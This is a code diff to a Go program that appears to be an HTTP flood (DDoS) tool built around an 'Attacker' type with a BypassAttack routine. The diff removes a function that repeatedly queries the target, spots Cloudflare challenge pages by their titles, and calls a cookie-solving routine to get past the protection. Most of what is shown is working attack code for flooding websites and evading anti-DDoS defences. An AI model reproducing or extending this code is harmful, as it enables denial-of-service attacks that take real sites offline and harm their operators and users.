@@ -1,10 +1,8 @@
 package main
 
 import (
-	"bytes"
 	crand "crypto/rand"
 	"crypto/tls"
-	"golang.org/x/net/html"
 	"math"
 	"math/big"
 	"math/rand"
@@ -225,73 +223,6 @@ func (a *Attacker) BypassAttack() {
 	for i := 0; i < a.attack.Thread+1; i++ {
 		expired <- true
 	}
-}
-
-func (a *Attacker) CheckResponse(expired chan bool) {
-	exit := false
-	go func() {
-		exit = <-expired
-	}()
-	client := &http.Client{
-		Transport: &http.Transport{
-			Proxy:        nil,
-			TLSNextProto: make(map[string]func(authority string, c *tls.Conn) http.RoundTripper),
-		},
-	}
-	for {
-		if exit {
-			break
-		}
-		request, err := a.BuildRequest()
-		if err != nil {
-			time.Sleep(time.Second)
-			continue
-		}
-		r, err := client.Do(request)
-		if err != nil {
-			time.Sleep(time.Second)
-			continue
-		}
-		if r.StatusCode == 403 {
-			a.SolveCookie()
-		} else if r.StatusCode == 503 {
-			parsed, err := html.Parse(r.Body)
-			if err != nil {
-				time.Sleep(time.Second)
-				continue
-			}
-			if GetTitle(parsed) == "Just a moment..." {
-				a.SolveCookie()
-			}
-		} else if r.StatusCode == 200 {
-			parsed, err := html.Parse(r.Body)
-			if err != nil {
-				time.Sleep(time.Second)
-				continue
-			}
-			if GetTitle(parsed) == "Attention Required! | Cloudflare" {
-				a.SolveCookie()
-			}
-		}
-		r.Body.Close()
-		time.Sleep(time.Second)
-	}
-}
-
-func GetTitle(n *html.Node) string {
-	if n.Type == html.ElementNode && n.Data == "title" {
-		var title bytes.Buffer
-		if err := html.Render(&title, n.FirstChild); err != nil {
-			panic(err)
-		}
-		return strings.TrimSpace(title.String())
-	}
-	for c := n.FirstChild; c != nil; c = c.NextSibling {
-		if title := GetTitle(c); title != "" {
-			return title
-		}
-	}
-	return ""
 }
 
 func (a *Attacker) Worker(expired chan bool) {
